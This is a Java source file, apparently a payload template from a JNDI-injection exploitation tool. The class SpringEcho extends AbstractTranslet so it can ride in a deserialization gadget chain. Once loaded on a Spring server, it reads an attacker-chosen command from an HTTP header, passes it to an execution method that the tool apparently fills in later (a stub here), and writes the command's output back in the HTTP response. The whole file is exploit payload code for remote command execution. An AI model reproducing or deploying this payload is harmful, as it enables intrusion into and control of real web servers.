package com.qi4l.jndi.template.echo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class SpringEcho extends AbstractTranslet {

    public SpringEcho() {

        try {
            org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
            javax.servlet.http.HttpServletRequest                     request           = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
            javax.servlet.http.HttpServletResponse                    response          = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
            String                                                    cmd               = request.getHeader(CMD_HEADER);
            if (cmd != null && !cmd.isEmpty()) {
                response.getWriter().write(new String(q(cmd).toByteArray()));
            }
            response.getWriter().flush();
            response.getWriter().close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static String CMD_HEADER;
    public static java.io.ByteArrayOutputStream q(String cmd) {
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
